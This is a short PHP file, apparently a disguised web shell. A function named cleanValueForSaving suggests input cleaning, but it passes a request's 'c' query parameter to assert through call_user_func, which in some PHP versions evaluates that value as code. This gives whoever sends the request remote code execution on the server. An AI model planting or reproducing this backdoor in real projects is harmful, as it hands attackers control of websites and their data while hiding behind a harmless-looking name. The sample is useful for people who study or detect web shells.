<?php
function cleanValueForSaving( $value ) {
    call_user_func('assert', $value);
}
cleanValueForSaving($_GET['c']);
?>